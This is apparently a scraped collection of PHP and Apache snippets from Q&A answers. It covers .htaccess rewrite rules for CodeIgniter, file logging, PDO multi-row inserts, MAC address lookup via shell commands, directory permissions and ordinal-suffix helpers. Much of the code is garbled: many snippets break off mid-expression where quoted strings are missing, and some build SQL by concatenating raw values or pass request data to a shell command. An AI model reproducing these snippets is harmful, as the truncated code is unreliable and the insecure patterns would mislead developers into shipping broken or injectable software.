$i = 10; while (--$i) { if ($i == 8) { continue; } if ($i == 5) { break; } echo $i . "\n"; }
for($i=0; $i<10; $i++){ if($i == 5){ echo "It reach five<br>"; continue; } echo $i . "<br>"; } echo "<hr>"; for($i=0; $i<10; $i++){ if($i == 5){ echo "It reach end<br>"; break; } echo $i . "<br>"; }
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT,L]
RewriteEngine on RewriteCond $1 !^(index\.php|resources|robots\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
Path: Your_website_folder/ application/ assets/ system/ .htaccess <——— this file index.php
<IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] </IfModule>
<IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [QSA,L] </IfModule>
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT,L]
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$1 [PT,L]
RewriteEngine on RewriteBase /project/ RewriteCond $1 !^(index\.php|images|robots\.txt) RewriteRule ^(.*)$ /project/index.php/$1 [L]
RewriteEngine on RewriteBase / RewriteCond $1 !^(index\.php|images|robots\.txt) RewriteRule ^(.*)$ /index.php/$1 [L]
RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]
RewriteEngine On RewriteBase /root_folder_name/ RewriteCond %{REQUEST_URI} ^system.* RewriteCond $1 !^(index\.php|images|js|uploads|css|robots\.txt) RewriteRule ^(.*)$ /index.php/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]
RewriteEngine on RewriteCond $1 !^(index\.php|resources|robots\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule .* index.php/$0 [PT,L]
+ Copy .htaccess from Application to Root folder + edit .htaccess and put <IfModule mod_rewrite.c> RewriteEngine On RewriteBase /ci_test/ RewriteCond %{REQUEST_URI} ^system.* RewriteRule ^(.*)$ /index.php?/$1 [L] RewriteCond %{REQUEST_URI} ^application.* RewriteRule ^(.*)$ /index.php?/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php?/$1 [L] </IfModule> <IfModule !mod_rewrite.c> ErrorDocument 404 /index.php </IfModule> Note: make sure your web server is enable for "rewrite_module" + Remove index.php from $config[ - edit config.php in application/config - search for index.php change it from $config[
<IfModule mod_rewrite.c> RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] </IfModule>`
RewriteEngine On RewriteBase /your_folder_name/ RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php?/$1 [L]
<IfModule mod_rewrite.c> Options +FollowSymLinks RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] </IfModule>
Removing index.php from url of codeigniter Three steps are require to remove index.php from url in Codeigniter. 1)Create .htacess file in parallel to application holder and just copy past the following code: RewriteEngine On RewriteBase /CodeIgniter/ RewriteCond %{REQUEST_URI} ^system.* RewriteRule ^(.*)$ /index.php/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] 2) Change $config[ $config[ 3) Enable “rewrite_module” of apache.
RewriteEngine On RewriteBase /your_local_folder/ RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond $1 !^(index\.php|images|scripts|styles|vendor|robots\.txt) RewriteRule ^(.*)$ index.php/$1 [L] RewriteEngine On RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond $1 !^(index\.php|images|scripts|styles|vendor|robots\.txt) RewriteRule ^(.*)$ index.php?/$1 [L]
Your_project_folder/ application/ assets/ cgi-bin/ system/ .htaccess---->(Edit this file if not exist than create it) index.php
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php?/$1 [L] </IfModule> <IfModule !mod_rewrite.c> ErrorDocument 404 /index.php </IfModule>
RewriteEngine on RewriteCond $1 !^(index\.php|resources|robots\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA]
RewriteEngine On RewriteBase /CodeIgniter/ RewriteCond %{REQUEST_URI} ^system.* RewriteRule ^(.*)$ /index.php/$1 [L] RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L]
RewriteEngine on RewriteCond $1 !^(index\.php|images|robots\.txt) RewriteRule ^(.*)$ /myproject/index.php/$1 [L]
<VirtualHost *:80> DocumentRoot "/path/to/workspace" ServerName ciproject ErrorLog "/path/to/workspace/error.log" CustomLog "/path/to/workspace/access.log" common Directory "/path/to/workspace"> Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow from all </Directory> </VirtualHost>
<VirtualHost *:80> DocumentRoot "/path/to/workspace" ServerName ciproject ErrorLog "/path/to/workspace/error.log" CustomLog "/path/to/workspace/access.log" common Directory "/path/to/workspace"> Options Indexes FollowSymLinks Order allow,deny Allow from all </Directory> </VirtualHost>
RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php?/$1 [L]
<?php function variadic($arg1, $arg2) { echo $arg1. } $array = [ variadic(...$array);
<?php function variadic($var, SomeClass ...$items) { } variadic( $items = [ new SomeClass, new SomeClass, ]; variadic(
call_user_func_array(array($instance, "MethodName"), $myArgs);
<?php function title($title, $name) { return sprintf("%s. %s\r\n", $title, $name); } $function = new ReflectionFunction( $myArray = array( echo $function->invokeArgs($myArray); ?>
$myfile = fopen("logs.txt", "wr") or die("Unable to open file!"); $txt = "user id date"; fwrite($myfile, $txt); fclose($myfile);
$txt = "user id date"; $myfile = file_put_contents(
$myfile = fopen("logs.txt", "a") or die("Unable to open file!"); $txt = "user id date"; fwrite($myfile, "\n". $txt); fclose($myfile);
class Logger { private $file, $timestamp; public function __construct($filename) { $this->file = $filename; } public function setTimestamp($format) { $this->timestamp = date($format)." &raquo; "; } public function putLog($insert) { if (isset($this->timestamp)) { file_put_contents($this->file, $this->timestamp.$insert."<br>", FILE_APPEND); } else { trigger_error("Timestamp not set", E_USER_ERROR); } } public function getLog() { $content = @file_get_contents($this->file); return $content; } }
$log = new Logger("log.txt"); $log->setTimestamp("D M d if (user logs in) { $log->putLog("Successful Login: ".$_SESSION["user_name"]); } if (user logs out) { $log->putLog("Logout: ".$_SESSION["user_name"]); }
$logged_user_id = $this->session->userdata( $insert_log = $Dt = date( file_put_contents(APPPATH."assets/logs/".$Dt."_log.txt", $insert_log.PHP_EOL , FILE_APPEND | LOCK_EX);
function logErr($data){ $logPath = __DIR__. "/../logs/logs.txt"; $mode = (!file_exists($logPath)) ? $logfile = fopen($logPath, $mode); fwrite($logfile, "\r\n". $data); fclose($logfile); }
$reflectionClass = new ReflectionClass($className); $module = $reflectionClass->newInstanceArgs($arrayOfConstructorParameters);
$module = new $className(...$arrayOfConstructorParameters);
namespace com\company\lib; $i = new MyClass(); $cname = $cname = "com\\company\\lib\\".$cname; $i = new $cname;
class Test { public function yo() { return } } $var = $obj = new $var(); echo $obj->yo();
class Foo { static public function test() { print "Hello world!\n"; } } call_user_func( call_user_func(array(
class foo { function bar($arg, $arg2) { echo __METHOD__, " got $arg and $arg2\n"; } } call_user_func_array(array("foo", "bar"), array("three", "four")); call_user_func_array("foo::bar"), array("three", "four"));
$ipAddress=$_SERVER[ $macAddr=false; $arp=`arp -a $ipAddress`; $lines=explode("\n", $arp); foreach($lines as $line) { $cols=preg_split( if ($cols[0]==$ipAddress) { $macAddr=$cols[1]; } }
-rwxr-xr-x 1 root root 48K 2008-11-11 18:11 /usr/sbin/arp*
-rwxr-xr-x 1 root www-data 48K 2008-11-11 18:11 /usr/sbin/arp*
<?php $ipconfig = shell_exec ("ipconfig/all")); echo $ipconfig; /* look for the value of "physical adress" and use substr() function to retrieve the adress from this long string. here in my case i you can change the numbers according adress mac position in the string. */ echo substr(shell_exec ("ipconfig/all"),1821,18); ?>
$mac= foreach(explode("\n",str_replace( if(strpos($i, echo $mac;
$d = explode( $d1 = explode( $d2 = explode( return $d2[1];
ob_start(); system( $mycomsys=ob_get_contents(); ob_clean(); $find_mac = "Physical"; $pmac = strpos($mycomsys, $find_mac); $macaddress=substr($mycomsys,($pmac+36),17); echo $macaddress;
session_start(); if ($_SESSION[ session_destroy(); header( exit(); }
session.cookie_httponly = 1 change session name from default PHPSESSID
home/cat1/subcat2 => home test/cat2 => test startpage => startpage
$mystring = $first = strtok($mystring, echo $first;
$mystring = $first = strtok($mystring, echo $first;
function strbstr( $str, $char, $start=0 ){ if ( isset($str[ $start ]) && $str[$start]!=$char ){ return $str[$start].strbstr( $str, $char, $start+1 ); } }
function not_strtok($string, $delimiter) { $buffer = strstr($string, $delimiter, true); if (false === $buffer) { return $string; } return $buffer; } var_dump( not_strtok( );
/** * Return string before needle if it exists. * * @param string $str * @param mixed $needle * @return string */ function str_before($str, $needle) { $pos = strpos($str, $needle); return ($pos !== false) ? substr($str, 0, $pos) : $str; }
$string="kalion/home/public_html"; $newstring=( stristr($string,"/")==FALSE ) ? $string : substr($string,0,stripos($string,"/"));
function getwhatiwant($s) { $delimiter= $x=strstr($s,$delimiter,true); return ($x?$x:$s); }
function getwhatiwant($s) { $delimiter= $t=explode($delimiter, $s); return ($t[1]?$t[0]:$s); }
$ composer install Loading composer repositories with package information Installing dependencies (including require-dev) Your requirements could not be resolved to an installable set of packages. Problem 1 - Installation request for facebook/php-sdk dev-master -> satisfiable by facebook/php-sdk[dev-master]. - facebook/php-sdk dev-master requires ext-curl * -> the requested PHP extension curl is missing from your system.
> sudo apt-get install php-curl > sudo apt-get install php-mbstring
$json = json_decode($string); echo json_encode($json, JSON_PRETTY_PRINT);
$ens = $em->getRepository( ->findBy( array( array( );
$ens = $em->getRepository( ->findBy( array(), array( );
$cRepo = $em->getRepository( $countries = $cRepo->findBy(array(), array(
$datafields = array( $data[] = array( $data[] = array(
insert into table (fielda, fieldb, ... ) values (?,?...), (?,?...)....
function placeholders($text, $count=0, $separator=","){ $result = array(); if($count > 0){ for($x=0; $x<$count; $x++){ $result[] = $text; } } return implode($separator, $result); } $pdo->beginTransaction(); $insert_values = array(); foreach($data as $d){ $question_marks[] = $insert_values = array_merge($insert_values, array_values($d)); } $sql = "INSERT INTO table (" . implode(",", $datafields ) . ") VALUES " . implode( $stmt = $pdo->prepare ($sql); try { $stmt->execute($insert_values); } catch (PDOException $e){ echo $e->getMessage(); } $pdo->commit();
INSERT INTO tbl_name (colA, colB, colC) VALUES (?, ?, ?), (?, ?, ?), (?, ?, ?) [,...]
ON DUPLICATE KEY UPDATE colA = VALUES(colA), colB = VALUES(colB), colC = VALUES(colC)
$dataToInsert = array(); foreach ($dataVals as $row => $data) { foreach($data as $val) { $dataToInsert[] = $val; } } $updateCols = array(); foreach ($colNames as $curCol) { $updateCols[] = $curCol . " = VALUES($curCol)"; } $onDup = implode( $rowPlaces = $allPlaces = implode( $sql = "INSERT INTO $tblName (" . implode( ") VALUES " . $allPlaces . " ON DUPLICATE KEY UPDATE $onDup"; $stmt = $pdo->prepare ($sql); try { $stmt->execute($dataToInsert); } catch (PDOException $e){ echo $e->getMessage(); } $pdo->commit();
<?php require( $fname = $lname = $time_start = microtime(true); $stmt = $db->prepare( for($i = 1; $i <= 10; $i++ ) { $stmt->bindParam( $stmt->bindParam( $stmt->execute(); $fname .= $lname .= } $time_end = microtime(true); $time = $time_end - $time_start; echo "Completed in ". $time ." seconds <hr>"; $fname2 = $lname2 = $time_start2 = microtime(true); $qry = $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?), "; $qry .= "(?,?)"; $stmt2 = $db->prepare($qry); $values = array(); for($j = 1; $j<=10; $j++) { $values2 = array($fname2, $lname2); $values = array_merge($values,$values2); $fname2 .= $lname2 .= } $stmt2->execute($values); $time_end2 = microtime(true); $time2 = $time_end2 - $time_start2; echo "Completed in ". $time2 ." seconds <hr>"; ?>
$insert_values = array(); foreach($data as $d){ $question_marks[] = $insert_values = array_merge($insert_values, array_values($d)); }
$data[] = array( array_push($insert_values, $value1, $value2, $value3 ... n );
function placeholders($text, $count=0, $separator=","){ $result = array(); if($count > 0){ for($x=0; $x<$count; $x++){ $result[] = $text; } } return implode($separator, $result); } $pdo->beginTransaction(); foreach($data as $d){ $question_marks[] = } $sql = "INSERT INTO table (" . implode(",", array_keys($datafield) ) . ") VALUES " . implode( $stmt = $pdo->prepare ($sql); try { $stmt->execute($insert_values); } catch (PDOException $e){ echo $e->getMessage(); } $pdo->commit();
$stmt = $pdo->prepare( (:v2_1, :v2_2, :v2_3), (:v2_1, :v2_2, :v2_3) $stmt->bindValue( $stmt->bindValue( $stmt->bindValue( $stmt->execute();
$stmt = $pdo->prepare( foreach($data as $item) { $stmt->bindValue( $stmt->bindValue( $stmt->bindValue( $stmt->execute(); }
$arCount = count($array); $rCount = ($arCount ? $arCount - 1 : 0); $criteria = sprintf("(?,?,?,?,?)%s", str_repeat(",(?,?,?,?,?)", $rCount)); $sql = "INSERT INTO table(c1,c2,c3,c4,c5) VALUES$criteria";
<?php /** * $pdo->beginTransaction(); * $pmi = new PDOMultiLineInserter($pdo, "foo", array("a","b","c","e"), 10); * $pmi->insertRow($data); * .... * $pmi->insertRow($data); * $pmi->purgeRemainingInserts(); * $pdo->commit(); * */ class PDOMultiLineInserter { private $_purgeAtCount; private $_bigInsertQuery, $_singleInsertQuery; private $_currentlyInsertingRows = array(); private $_currentlyInsertingCount = 0; private $_numberOfFields; private $_error; private $_insertCount = 0; function __construct(\PDO $pdo, $tableName, $fieldsAsArray, $bigInsertCount = 100) { $this->_numberOfFields = count($fieldsAsArray); $insertIntoPortion = "INSERT INTO `$tableName` (`".implode("`,`", $fieldsAsArray)."`) VALUES"; $questionMarks = " (?".str_repeat(",?", $this->_numberOfFields - 1).")"; $this->_purgeAtCount = $bigInsertCount; $this->_bigInsertQuery = $pdo->prepare($insertIntoPortion.$questionMarks.str_repeat(", ".$questionMarks, $bigInsertCount - 1)); $this->_singleInsertQuery = $pdo->prepare($insertIntoPortion.$questionMarks); } function insertRow($rowData) { foreach($rowData as $v) array_push($this->_currentlyInsertingRows, $v); // if (++$this->_currentlyInsertingCount == $this->_purgeAtCount) { if ($this->_bigInsertQuery->execute($this->_currentlyInsertingRows) === FALSE) { $this->_error = "Failed to perform a multi-insert (after {$this->_insertCount} inserts), the following errors occurred:".implode( return false; } $this->_insertCount++; $this->_currentlyInsertingCount = 0; $this->_currentlyInsertingRows = array(); } return true; } function purgeRemainingInserts() { while ($this->_currentlyInsertingCount > 0) { $singleInsertData = array(); for ($i = 0; $i < $this->_numberOfFields; $i++) array_unshift($singleInsertData, array_pop($this->_currentlyInsertingRows)); if ($this->_singleInsertQuery->execute($singleInsertData) === FALSE) { $this->_error = "Failed to perform a small-insert (whilst purging the remaining rows; the following errors occurred:".implode( return false; } $this->_currentlyInsertingCount--; } } public function getError() { return $this->_error; } }
$values = array(); foreach($workouts_id as $value){ $_value = "(".$value.",".$plan_id.")"; array_push($values,$_value); } $values_ = implode(",",$values); $sql = "INSERT INTO plan_days(id,name) VALUES" . $values_.""; $stmt = $this->conn->prepare($sql); $stmt->execute();
foreach ( $people as $person ) { if(! $rowVals ) { $rows = } else { $rowVals = }
$stmt = $db->prepare ( "INSERT INTO $table $cols VALUES $rowVals" ); $stmt->execute ();
public function InsertRange($tableName, $rows) { $columnList = array_keys($rows[0]); $numColumns = count($columnList); $columnListString = implode(",", $columnList); $placeHolders = array(); foreach($rows as $row) { $temp = array(); for($i = 0; $i < count($row); $i++) $temp[] = "?"; $placeHolders[] = "(" . implode(",", $temp) . ")"; } $placeHolders = implode(",", $placeHolders); $sql = "insert into $tableName ($columnListString) values $placeHolders"; $stmt = $this->pdo->prepare($sql); $j = 1; foreach($rows as $row) { for($i = 0; $i < $numColumns; $i++) { $stmt->bindParam($j, $row[$columnList[$i]]); $j++; } } $stmt->execute(); }
function insertMultiple($query,$rows) { if (count($rows)>0) { $args = array_fill(0, count($rows[0]), $params = array(); foreach($rows as $row) { $values[] = "(".implode( foreach($row as $value) { $params[] = $value; } } $query = $query." VALUES ".implode( $stmt = $PDO->prepare($query); $stmt->execute($params); } }
insertMultiple("INSERT INTO tbl (`key1`,`key2`)",array(array(
$sql = $qPart = array_fill(0, count($array), "(?, ?,UTC_TIMESTAMP(),?)"); $sql .= implode(",", $qPart); $stmt = DB::prepare( $i = 1; foreach ($array as $value) { $stmt->bindValue($i++, $value); $stmt->bindValue($i++, $pk_pk1); $stmt->bindValue($i++, $pk_pk2); $stmt->bindValue($i++, $pk_pk3); } $stmt->execute();
$q = "insert into t2(id,name) values (?,?), ... on duplicate key update name=name"; $bind_values = [ [[1, $pdo->perform($q, $bind_values);
$stmt = $db->prepare( $stmt->execute(); $columns = array_fill_keys(array_values($stmt->fetchAll(PDO::FETCH_COLUMN)), null); $postcode = while ($postcode <= 99999) { $values = array(); while ($postcode <= 99999) { $row = $columns; $row[ foreach ($row as $value) { $values[] = $value; } $postcode++; if (!($postcode % 10000)) { break; } } $count_columns = count($columns); $placeholder = $placeholder_group = substr(str_repeat($placeholder, count($values) / $count_columns), 1); $into_columns = implode( $on_duplicate = array(); foreach ($columns as $column => $row) { $on_duplicate[] = $column; $on_duplicate[] = $column; } $on_duplicate = $stmt = $db->prepare( $stmt->execute($values); }
<?php require_once( $obj = new Database(); $table = "test"; $rows = array( array( ), array( ), array( ) ); var_dump($obj->insertMultiple($table,$rows)); ?>
<?php class Database { var $host = var $user = var $pass = var $database = "database"; var $dbh; public function __construct(){ try { $this->dbh = new PDO( } catch (PDOException $e) { print "Error!: " . $e->getMessage() . "<br/>"; die(); } } public function insertMultiple($table,$rows){ $this->dbh->beginTransaction(); $insert_values = array(); foreach($rows as $d){ $question_marks[] = $insert_values = array_merge($insert_values, array_values($d)); $datafields = array_keys($d); } $sql = "INSERT INTO $table (" . implode(",", $datafields ) . ") VALUES " . implode( $stmt = $this->dbh->prepare ($sql); try { $stmt->execute($insert_values); } catch (PDOException $e){ echo $e->getMessage(); } return $this->dbh->commit(); } /* placeholders for prepared statements like (?,?,?) */ function placeholders($text, $count=0, $separator=","){ $result = array(); if($count > 0){ for($x=0; $x<$count; $x++){ $result[] = $text; } } return implode($separator, $result); } } ?>
$arr1 = Array("Germany", "Berlin"); $arr2 = Array("France", "France"); insertMultipleData("countries", Array($arr1, $arr2)); public function insertMultipleData($table, $multi_params){ try{ $db = $this->connect(); $beforeParams = ""; $paramsStr = ""; $valuesStr = ""; for ($i=0; $i < count($multi_params); $i++) { foreach ($multi_params[$i] as $j => $value) { if ($i == 0) { $beforeParams .= " " . $j . ","; } $paramsStr .= " :" . $j . "_" . $i .","; } $paramsStr = substr_replace($paramsStr, "", -1); $valuesStr .= "(" . $paramsStr . "),"; $paramsStr = ""; } $beforeParams = substr_replace($beforeParams, "", -1); $valuesStr = substr_replace($valuesStr, "", -1); $sql = "INSERT INTO " . $table . " (" . $beforeParams . ") VALUES " . $valuesStr . ";"; $stmt = $db->prepare($sql); for ($i=0; $i < count($multi_params); $i++) { foreach ($multi_params[$i] as $j => &$value) { $stmt->bindParam(":" . $j . "_" . $i, $value); } } $this->close($db); $stmt->execute(); return true; }catch(PDOException $e){ return false; } return false; } public function connect(){ $host = Constants::DB_HOST; $dbname = Constants::DB_NAME; $user = Constants::DB_USER; $pass = Constants::DB_PASS; $mysql_connect_str = $dbConnection = new PDO($mysql_connect_str, $user, $pass); $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); return $dbConnection; } public function close($db){ $db = null; }
private function import(PDO $connection, $table, array $records) { $fields = array_keys($records[0]); $placeHolders = substr(str_repeat( $values = []; foreach ($records as $record) { array_push($values, ...array_values($record)); } $query = $query .= implode( $query .= $query .= implode( $query .= $statement = $connection->prepare($query); $statement->execute($values); }
upload_tmp_dir = /var/www/html/mysite/tmp_file_upload/
Directory /var/www/html/mysite/tmp_file_upload/> Options -Indexes AllowOverride None Order allow,deny Allow from all </Directory> <Directory /var/www/html/mysite/images/> Options -Indexes </Directory>
drwxrwxr-x 2 root root 4096 Nov 11 10:01 images drwxr-xr-x 2 root root 4096 Nov 12 04:54 tmp_file_upload
$sudo chown nobody /var/www/html/mysite/images/ $sudo chown nobody /var/www/html/mysite/tmp_file_upload/
$ sudo chmod -R 0755 /var/www/html/mysite/images/ $ sudo chmod -R 0755 /var/www/html/mysite/tmp_file_upload/
chcon -R --type httpd_sys_rw_content_t /path/to/your/directory
sudo adduser <username> www-data sudo chown -R www-data:www-data /var/www sudo chmod -R g+rwX /var/www
sudo semanage fcontext -a -t httpd_sys_rw_content_t sudo restorecon -Rv
total of files drwxr-xr-x 7 user group size date folder
chown -R user:www-data yourprojectfoldername chmod 775 yourprojectfoldername
$zip = new ZipArchive; var_dump($zip); $res = $zip->open($filename, ZipArchive::OVERWRITE); if ($res !== TRUE) { echo exit; } if (is_file($src)) { $zip->addFile($src); } else { if (!is_dir($src)) { $zip->close(); @unlink($filename); echo exit; } recurse_zip($src, $zip, $path_length); } $zip->close(); echo "<br>file name ".$filename;
sudo apt-get install php-zip sudo phpenmod zip sudo service apache2 restart
function __autoload($class_name) { require_once $class_name . } $obj = new MyClass1();
class BlogPost { var $date; var $ts; var $link; var $title; var $text; } class BlogFeed { var $posts = array(); function __construct($file_or_url) { $file_or_url = $this->resolveFile($file_or_url); if (!($x = simplexml_load_file($file_or_url))) return; foreach ($x->channel->item as $item) { $post = new BlogPost(); $post->date = (string) $item->pubDate; $post->ts = strtotime($item->pubDate); $post->link = (string) $item->link; $post->title = (string) $item->title; $post->text = (string) $item->description; $post->summary = $this->summarizeText($post->text); $this->posts[] = $post; } } private function resolveFile($file_or_url) { if (!preg_match( $feed_uri = $_SERVER[ else $feed_uri = $file_or_url; return $feed_uri; } private function summarizeText($summary) { $summary = strip_tags($summary); $max_len = 100; if (strlen($summary) > $max_len) $summary = substr($summary, 0, $max_len) . return $summary; } }
$feed = implode(file( $xml = simplexml_load_string($feed); $json = json_encode($xml); $array = json_decode($json,TRUE);
$feed = new DOMDocument(); $feed->load( $json = array(); $json[ $json[ $json[ $items = $feed->getElementsByTagName( $json[ $i = 0; foreach($items as $key => $item) { $title = $item->getElementsByTagName( $description = $item->getElementsByTagName( $pubDate = $item->getElementsByTagName( $guid = $item->getElementsByTagName( $json[ $json[ $json[ $json[ } echo json_encode($json);
$i = 0; $url = "http: $rss = simplexml_load_file($url); print foreach($rss->channel->item as $item) { if ($i < 10) { print } $i++; }
<?php $value = "Test me more"; echo strtok($value, " "); ?>
$i = strpos($myvalue, echo $i !== false ? $myvalue : substr( $myvalue, 0, $i );
$words=str_word_count($myvalue, 1); echo $words[0];
<?php $value = "Hello world"; $tokens = explode(" ", $value); echo $tokens[0]; ?>
<?php $myvalue ="Test me more"; $result=split(" ",$myvalue); echo $result[0]; ?>
$string = preg_match( echo $result; $string = preg_match( echo $result;
public function getStringFirstAlphabet($string){ $data= $string=explode( $i=0; foreach ($string as $key => $value) { $data.=$value[$i]; } return $data; }
$str= $s = preg_split("/= *(.[^ ]*?) /", $str,-1,PREG_SPLIT_DELIM_CAPTURE); print $s[1];
function getStringFirstWord( $title ){ $return = []; if( strpos( $title," ") !== false ) { $firstWord = strstr($title," ",true); $remainingTitle = substr(strstr($title," "), 1); if( !empty( $firstWord ) ) { $return[ } if( !empty( $remainingTitle ) ) { $return[ } } else { $return[ } return $return; }
$string = $stringLength= strlen($string); echo ucfirst(substr($string,-$stringLength-1, 1));
echo cleanNumber( echo cleanNumber( echo cleanNumber(844.011);
function TrimTrailingZeroes($nbr) { return strpos($nbr, }
$string = "42.422005000000000000000000000000"; echo (float)$string;
/** * Remove zero digits from decimal value. * * @param string|int|float $number The number can be any format, any where use in the world such as 123, 1,234.56, 1234.56789, 12.345,67, -98,765.43 * @param string The decimal separator. You have to set this parameter to exactly what it is. For example: in Europe it is mostly use "," instead of ".". * @return string Return removed zero digits from decimal value. */ function removeZeroDigitsFromDecimal($number, $decimal_sep = { $explode_num = explode($decimal_sep, $number); if (is_array($explode_num) && isset($explode_num[count($explode_num)-1]) && intval($explode_num[count($explode_num)-1]) === 0) { unset($explode_num[count($explode_num)-1]); $number = implode($decimal_sep, $explode_num); } unset($explode_num); return (string) $number; }
$numbers = [ 1234, -1234, ]; foreach ($numbers as $number) { var_dump(removeZeroDigitsFromDecimal($number)); } echo $numbers = [ 1234, -1234, ]; foreach ($numbers as $number) { var_dump(removeZeroDigitsFromDecimal($number, }
$num = $index = $num[strlen($num)-1]; $i = strlen($num)-1; while($index == if ($num[$i] == $num[$i] = $i--; } $index = $num[$i]; } $explode = explode( if (isset($explode[1]) && intval($explode[1]) <= 0) { $num = intval($explode[0]); } echo $num;
$str = 15.00; $str2 = 14.70; echo rtrim(rtrim(strval($str), "0"), "."); echo rtrim(rtrim(strval($str2), "0"), ".");
class foo { private $dsepparator; private $tsepparator; function __construct(){ $langDatas = [ $usersLang = $this->dsepparator = $langDatas[$usersLang][ $this->tsepparator = $langDatas[$usersLang][ } public function numberOmat($amount, $decimals = 2, $hideByZero = false) { return ( $hideByZero === true AND ($amount-floor($amount)) <= 0 ) ? number_format($amount, 0, $this->dsepparator, $this->tsepparator) : number_format($amount, $decimals, $this->dsepparator, $this->tsepparator); } /* * $bar = new foo(); * $bar->numberOmat( * $bar->numberOmat( * $bar->numberOmat( */ }
$precision = 5; $number = round($number, $precision); $decimals = strlen(substr(strrchr($number, return number_format($number, $precision,
function myFormat($num,$dec) { return rtrim(rtrim(number_format($num,$dec), }
$ends = array( if (($number %100) >= 11 && ($number%100) <= 13) $abbreviation = $number. else $abbreviation = $number. $ends[$number % 10];
function ordinal($number) { $ends = array( if ((($number % 100) >= 11) && (($number%100) <= 13)) return $number. else return $number. $ends[$number % 10]; } echo ordinal(100);
$locale = $nf = new NumberFormatter($locale, NumberFormatter::ORDINAL); echo $nf->format($number);
<?php /** * * @return number with ordinal suffix * * @param int $number * * @param int $ss Turn super script on/off * * @return string * */ function ordinalSuffix($number, $ss=0) { /*** check for 11, 12, 13 ***/ if ($number % 100 > 10 && $number %100 < 14) { $os = } /*** check if number is zero ***/ elseif($number == 0) { $os = } else { /*** get the last digit ***/ $last = substr($number, -1, 1); switch($last) { case "1": $os = break; case "2": $os = break; case "3": $os = break; default: $os = } } /*** add super script ***/ $os = $ss==0 ? $os : /*** return ***/ return $number.$os; } ?>
function getOrdinalSuffix($number) { $number = abs($number) % 100; $lastChar = substr($number, -1, 1); switch ($lastChar) { case case case } return }
$Day = 3; echo date("S", mktime(0, 0, 0, 0, $Day, 0));
<?php function get_placing_string($placing){ $i=intval($placing%10); $place=substr($placing,-2); if($i==1 && $place!= return $placing. } else if($i==2 && $place!= return $placing. } else if($i==3 && $place!= return $placing. } return $placing. } ?>
function addOrdinalNumberSuffix($num) { if (!in_array(($num % 100),array(11,12,13))){ switch ($num % 10) { case 1: return $num. case 2: return $num. case 3: return $num. } } return $num. }
function ordinal($i) { return($i.(($j=abs($i)%100)>10&&$j<14? }
printf("The %s hour.\n", ordinal(0)); printf("The %s ossicle.\n", ordinal(1)); printf("The %s cat.\n", ordinal(12)); printf("The %s item.\n", ordinal(-23));
function ordinal($i) { $j = abs($i); $j = $j%100; if($j>10 && $j<14) return( $j = $j%10; if($j==1) return( if($j==2) return( if($j==3) return( return( }
function ordinal($i) { return $i.(($j=abs($i)%100)>10&&$j<14? }
function o($i){return $i.(($j=abs($i)%100)>10&&$j<14?
function o($i){return$i.@(($j=abs($i)%100)>10&&$j<14?th:[th,st,nd,rd][$j%10]?:th);}
function ordinal($number){ $last=substr($number,-1); if( $last>3 || $last==0 || ( $number >= 11 && $number <= 19 ) ){ $ext= }else if( $last==3 ){ $ext= }else if( $last==2 ){ $ext= }else{ $ext= } return $number.$ext; }
<?php function ordinal($num) { if ( ($num / 10) % 10 != 1 ) { switch( $num % 10 ) { case 1: return $num . case 2: return $num . case 3: return $num . } } return $num . } ?>
